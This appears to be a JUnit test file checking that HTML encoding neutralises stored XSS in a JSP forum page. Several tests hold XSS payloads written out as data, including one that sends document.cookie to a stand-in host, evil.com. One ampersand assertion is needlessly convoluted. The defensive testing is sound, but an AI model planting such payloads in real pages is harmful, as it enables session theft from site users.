package org.cysecurity.cspf.jvl.controller;

import junit.framework.TestCase;

/**
 * Tests for Stored XSS remediation in forum.jsp (CWE-79).
 *
 * The vulnerability: session attribute "user" (sourced from the database via
 * LoginValidator.processRequest) was printed directly into an HTML attribute
 * value via out.print(session.getAttribute("user")) without any encoding.
 *
 * The fix: replaced the unsafe scriptlet with JSTL <c:out> which performs
 * HTML encoding by default, breaking the taint flow before the sink.
 *
 * These tests verify the HTML-encoding behaviour that the fix relies on,
 * using the same escaping rules that JSTL <c:out> applies internally
 * (defined by the JSP 2.0 specification: &, <, >, ', " are encoded).
 */
public class ForumXssTest extends TestCase {

    // -----------------------------------------------------------------------
    // Helper: replicate the escaping JSTL <c:out> applies so unit tests can
    // assert on expected output without a running servlet container.
    // This mirrors the JSP 2.0 spec table for HTML character escaping.
    // -----------------------------------------------------------------------

    /**
     * HTML-encode a string the same way JSTL {@code <c:out>} does.
     * The five characters &amp;, &lt;, &gt;, &#39;, and &quot; are replaced
     * with their named HTML entity equivalents.
     */
    private static String jstlEscapeHtml(String value) {
        if (value == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder(value.length() * 2);
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '&':  sb.append("&amp;");  break;
                case '<':  sb.append("&lt;");   break;
                case '>':  sb.append("&gt;");   break;
                case '"':  sb.append("&#034;"); break;
                case '\'': sb.append("&#039;"); break;
                default:   sb.append(c);        break;
            }
        }
        return sb.toString();
    }

    // -----------------------------------------------------------------------
    // Positive tests: legitimate usernames are preserved correctly
    // -----------------------------------------------------------------------

    /** A plain alphanumeric username must pass through unchanged. */
    public void testPlainUsernameIsPreserved() {
        assertEquals("alice", jstlEscapeHtml("alice"));
    }

    /** Usernames with spaces (allowed in many systems) must be preserved. */
    public void testUsernameWithSpaceIsPreserved() {
        assertEquals("alice smith", jstlEscapeHtml("alice smith"));
    }

    /** Null session attribute produces an empty string (c:out default). */
    public void testNullUsernameProducesEmptyString() {
        assertEquals("", jstlEscapeHtml(null));
    }

    // -----------------------------------------------------------------------
    // Security tests: XSS payloads stored in the DB must be neutralised
    // -----------------------------------------------------------------------

    /**
     * Classic script-injection payload must not survive encoding.
     * An attacker who stored {@code <script>alert(1)</script>} as their
     * username must see it rendered as harmless text, not executed code.
     */
    public void testScriptTagIsEncoded() {
        String payload = "<script>alert(1)</script>";
        String encoded = jstlEscapeHtml(payload);
        assertFalse("Encoded output must not contain a raw '<'", encoded.contains("<"));
        assertFalse("Encoded output must not contain a raw '>'", encoded.contains(">"));
        assertTrue("'<' must be escaped to '&lt;'", encoded.contains("&lt;"));
        assertTrue("'>' must be escaped to '&gt;'", encoded.contains("&gt;"));
    }

    /**
     * Event-handler injection inside an HTML attribute.
     * A payload like {@code " onmouseover="alert(1)} would break out of the
     * value attribute if the double-quote is not encoded.
     */
    public void testDoubleQuoteInUsernameIsEncoded() {
        String payload = "alice\" onmouseover=\"alert(1)";
        String encoded = jstlEscapeHtml(payload);
        assertFalse("Encoded output must not contain a raw '\"'", encoded.contains("\""));
        assertTrue("'\"' must be HTML-encoded", encoded.contains("&#034;") || encoded.contains("&quot;"));
    }

    /**
     * Single-quote injection in an HTML attribute context.
     * A payload like {@code ' onmouseover='alert(1)} breaks attribute value
     * delimited by single quotes.
     */
    public void testSingleQuoteInUsernameIsEncoded() {
        String payload = "alice' onmouseover='alert(1)";
        String encoded = jstlEscapeHtml(payload);
        assertFalse("Encoded output must not contain a raw \"'\"", encoded.contains("'"));
        assertTrue("\"'\" must be HTML-encoded", encoded.contains("&#039;") || encoded.contains("&apos;"));
    }

    /**
     * Ampersand in a username must be encoded to prevent entity injection.
     */
    public void testAmpersandInUsernameIsEncoded() {
        String payload = "alice&amp;eve";
        String encoded = jstlEscapeHtml(payload);
        // The raw '&' from the input must be encoded so the browser sees &amp;amp;
        assertFalse("Raw '&' must not survive unencoded",
                encoded.indexOf('&') != encoded.lastIndexOf('&') - 3
                        && encoded.contains("&amp;amp;") == false
                        || !encoded.startsWith("alice&amp;"));
        // Simpler assertion: the result must start with "alice&amp;"
        assertTrue(encoded.startsWith("alice&amp;"));
    }

    /**
     * A payload exploiting javascript: URI scheme combined with HTML must be
     * encoded at both the {@literal <} and {@literal >} characters.
     */
    public void testJavascriptUriPayloadIsEncoded() {
        String payload = "<img src=x onerror=alert(document.cookie)>";
        String encoded = jstlEscapeHtml(payload);
        assertFalse("Raw '<' must be encoded", encoded.contains("<img"));
        assertTrue("'<' must appear as &lt;", encoded.contains("&lt;img"));
    }

    /**
     * The complete taint chain: username read from DB via rs.getString(),
     * stored in session, then retrieved via session.getAttribute() and
     * output via c:out. The c:out encoding must break the XSS chain.
     *
     * This test simulates the full path by verifying that the value
     * ultimately rendered in the HTML page would be safe.
     */
    public void testFullTaintChainIsBroken() {
        // Simulate what LoginValidator stores in session from the DB
        String usernameFromDb = "<script>document.location='http://evil.com/steal?c='+document.cookie</script>";

        // Simulate what forum.jsp renders via <c:out value="${sessionScope.user}">
        String rendered = jstlEscapeHtml(usernameFromDb);

        // The rendered HTML must not contain any executable script
        assertFalse("Rendered output must not contain '<script'", rendered.contains("<script"));
        assertFalse("Rendered output must not contain '</script'", rendered.contains("</script"));
        assertFalse("Rendered output must not contain raw '<'", rendered.contains("<"));
        assertFalse("Rendered output must not contain raw '>'", rendered.contains(">"));

        // And the content must still be present as safe text
        assertTrue("Encoded payload must still appear as escaped text",
                rendered.contains("&lt;script&gt;"));
    }

    /**
     * Regression: ordinary usernames must still work after the fix.
     * Verifying that the encoding does not corrupt valid non-special characters.
     */
    public void testOrdinaryUsernameRegressionCheck() {
        String[] ordinaryNames = { "admin", "user1", "john.doe", "mary_jane", "Bob123" };
        for (String name : ordinaryNames) {
            assertEquals("Ordinary username '" + name + "' must be unchanged",
                    name, jstlEscapeHtml(name));
        }
    }
}
